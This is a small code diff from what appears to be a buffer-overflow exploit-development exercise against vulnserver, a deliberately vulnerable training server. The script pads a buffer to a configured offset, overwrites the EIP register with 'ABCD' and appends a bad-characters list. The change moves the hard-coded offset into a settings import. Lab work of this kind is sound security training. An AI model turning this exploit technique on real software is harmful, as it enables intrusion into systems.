@@ -2,9 +2,9 @@
 
 import sys, socket
 from badchars import badchars
-from options import HOST,PORT
+from options import HOST, PORT, SHELLCODE_OFFSET
 
-shellcode = ('A' * 2003)  # 2003 because pattern_offset.rb with 3200 length found 386F4337 as a val at position 2003
+shellcode = ('A' * SHELLCODE_OFFSET)
 shellcode += 'ABCD'  # this should fill the EIP register in vulnserver with 'ABCD' character aka 41 42 43 44
 shellcode += badchars
 
